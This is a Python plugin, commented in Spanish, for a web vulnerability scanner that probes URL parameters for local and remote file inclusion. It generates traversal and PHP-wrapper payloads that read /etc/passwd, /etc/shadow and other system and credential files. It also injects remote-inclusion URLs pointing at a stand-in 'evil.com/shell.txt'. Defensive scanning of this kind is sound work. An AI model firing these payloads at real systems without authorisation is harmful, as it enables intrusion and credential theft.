"""
Plugin de detección de Local File Inclusion (LFI) y Remote File Inclusion (RFI)
"""
import asyncio
import re
from typing import List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from plugins.base_plugin import BasePlugin, Finding
from config.settings import PLUGIN_CONFIG
from utils.logger import get_logger

logger = get_logger(__name__)

class LFIScanner(BasePlugin):
    """Scanner de vulnerabilidades LFI/RFI"""
    
    def __init__(self):
        super().__init__(
            name="LFI/RFI Scanner",
            description="Detecta vulnerabilidades de inclusión de archivos locales y remotos"
        )
        self.config = PLUGIN_CONFIG["lfi"]
        self.depth = self.config["depth"]
        
        # Payloads LFI básicos
        self.lfi_payloads = self._generate_lfi_payloads()
        
        # Payloads RFI
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/evil",
            "//evil.com/shell.txt"
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            r"root:.*:0:0:",  # /etc/passwd
            r"\[boot loader\]",  # boot.ini
            r"<\?php",  # PHP code
            r"<\?xml",  # XML files
            r"DB_PASSWORD",  # Config files
            r"mysql_connect",  # Database configs
            r"\[extensions\]",  # php.ini
            r"for 16-bit app support",  # win.ini
        ]
    
    def _generate_lfi_payloads(self) -> List[str]:
        """Genera payloads LFI con diferentes profundidades"""
        base_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\Windows\\win.ini",
        ]
        
        payloads = []
        
        for file_path in base_files:
            # Payload directo
            payloads.append(file_path)
            
            # Directory traversal
            for i in range(1, self.depth + 1):
                traversal = "../" * i
                payloads.append(traversal + file_path.lstrip("/"))
                
                # Con null byte (para versiones PHP antiguas)
                if self.config["null_byte"]:
                    payloads.append(traversal + file_path.lstrip("/") + "%00")
                    payloads.append(traversal + file_path.lstrip("/") + "\x00")
            
            # Codificación URL doble
            encoded = file_path.replace("/", "%2f").replace("\\", "%5c")
            payloads.append(encoded)
            
            # Wrapper PHP
            if file_path.startswith("/"):
                payloads.append(f"php://filter/convert.base64-encode/resource={file_path}")
                payloads.append(f"file://{file_path}")
                payloads.append(f"expect://{file_path}")
        
        return payloads
    
    async def scan(self, target_url: str, client, **kwargs) -> List[Finding]:
        """Escanea URL en busca de LFI/RFI"""
        logger.info(f"[LFI] Iniciando escaneo en {target_url}")
        
        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            logger.info(f"[LFI] No se encontraron parámetros en {target_url}")
            return []
        
        # Escanear cada parámetro
        tasks = []
        for param_name in params.keys():
            tasks.append(self._scan_parameter(target_url, param_name, client))
        
        await asyncio.gather(*tasks)
        
        logger.info(f"[LFI] Escaneo completado. Vulnerabilidades: {len(self.findings)}")
        return self.findings
    
    async def _scan_parameter(self, url: str, param_name: str, client):
        """Escanea un parámetro específico"""
        
        # Test LFI
        await self._test_lfi(url, param_name, client)
        
        # Test RFI
        await self._test_rfi(url, param_name, client)
    
    async def _test_lfi(self, url: str, param_name: str, client):
        """Prueba vulnerabilidad LFI"""
        
        for payload in self.lfi_payloads:
            test_url = self._inject_payload(url, param_name, payload)
            
            response = await client.get(test_url)
            self.stats["requests_sent"] += 1
            
            if not response:
                continue
            
            # Verificar patrones de éxito
            for pattern in self.success_patterns:
                if re.search(pattern, response.text, re.IGNORECASE | re.MULTILINE):
                    finding = Finding(
                        plugin_name=self.name,
                        severity="HIGH",
                        title=f"Local File Inclusion en parámetro '{param_name}'",
                        description=f"El parámetro '{param_name}' permite inclusión de archivos locales. "
                                  f"Se detectó contenido sensible: '{pattern}'",
                        url=test_url,
                        parameter=param_name,
                        payload=payload,
                        request=f"GET {test_url}",
                        response=response.text[:500],
                        remediation="Validar y sanitizar rutas de archivo. Usar whitelist de archivos permitidos. "
                                  "Evitar construcción dinámica de rutas. Deshabilitar allow_url_include en PHP.",
                        cwe="CWE-22",
                        cvss_score=7.5
                    )
                    self.add_finding(finding)
                    return  # Una vulnerabilidad por parámetro
    
    async def _test_rfi(self, url: str, param_name: str, client):
        """Prueba vulnerabilidad RFI"""
        
        for payload in self.rfi_payloads:
            test_url = self._inject_payload(url, param_name, payload)
            
            response = await client.get(test_url)
            self.stats["requests_sent"] += 1
            
            if not response:
                continue
            
            # Verificar si se intentó cargar el recurso remoto
            # Nota: En producción, usarías un servidor de callback propio
            if "evil.com" in response.text or len(response.text) > 10000:
                finding = Finding(
                    plugin_name=self.name,
                    severity="CRITICAL",
                    title=f"Remote File Inclusion en parámetro '{param_name}'",
                    description=f"El parámetro '{param_name}' permite inclusión de archivos remotos. "
                                f"Esto puede llevar a ejecución remota de código.",
                    url=test_url,
                    parameter=param_name,
                    payload=payload,
                    request=f"GET {test_url}",
                    response=response.text[:500],
                    remediation="Deshabilitar allow_url_include en PHP. Validar todas las inclusiones de archivos. "
                                "Usar whitelist estricta. Implementar WAF.",
                    cwe="CWE-98",
                    cvss_score=9.8
                )
                self.add_finding(finding)
                return
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inyecta payload en un parámetro de la URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        params[param_name] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        
        return urlunparse(new_parsed)